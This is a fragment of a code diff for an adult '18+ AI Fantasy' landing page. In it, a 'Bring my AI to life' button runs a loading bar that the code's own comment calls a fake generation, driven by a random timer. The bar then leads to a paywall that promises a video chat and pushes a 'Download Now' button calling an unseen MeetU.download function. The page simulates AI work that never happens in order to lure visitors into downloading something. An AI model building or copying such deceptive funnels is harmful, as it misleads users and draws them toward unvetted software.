+  });
+  app.appendChild(grid);
+
+  const btn = el(`<button class="sparkle-btn">✨ Bring my AI to life</button>`);
+  btn.addEventListener("click", ()=>{
+    // fake "setting the scene" generation, then paywall
+    app.innerHTML = "";
+    app.appendChild(el(`<div class="topbar"><div class="logo">SWIPEY</div><div class="badge">18+ AI Fantasy</div></div>`));
+    const lw = el(`<div class="loading-wrap fade-in">
+        <div class="loading-heart">💜</div>
+        <div class="loading-bar"><i style="width:0%"></i></div>
+        <div class="loading-pct">0%</div>
+        <div class="loading-label">Setting The Scene…</div>
+      </div>`);
+    app.appendChild(lw);
+    const fill = lw.querySelector(".loading-bar i");
+    const pct = lw.querySelector(".loading-pct");
+    let p = 0;
+    const t = setInterval(()=>{
+      p += 4 + Math.random()*9;
+      if (p >= 100){ p = 100; clearInterval(t); state.step = STEPS.indexOf(STEPS.find(x=>x.id==="paywall")); render(); return; }
+      fill.style.width = p+"%";
+      pct.textContent = Math.floor(p)+"%";
+    }, 130);
+  });
+  app.appendChild(btn);
+}
+
+function k2(){
+  MeetU.download(event);
+}
+
+function renderPaywall(){
+  const step = STEPS[state.step];
+  const styleObj = DATA.style.find(x=>x.value===state.sel.style) || DATA.style[0];
+  const wrap = el(`<div class="paywall fade-in">
+      <h1 class="title">${titleHTML(step.title)}</h1>
+      <div class="pw-babe"><img src="${styleObj.img}" alt=""></div>
+      <p class="pw-sub">She is waiting for you inside… Start video chat in secs.</p>
+      <button class="sparkle-btn download-btn" onclick="k2()">
+        <span class="dl-icon">⬇</span><span>Download Now</span>
+      </button>
+      <p class="pw-note">Free download · works on your phone</p>
+    </div>`);
+  app.appendChild(wrap);
+}
+
+render();
+</script>
+</body>
+</html>
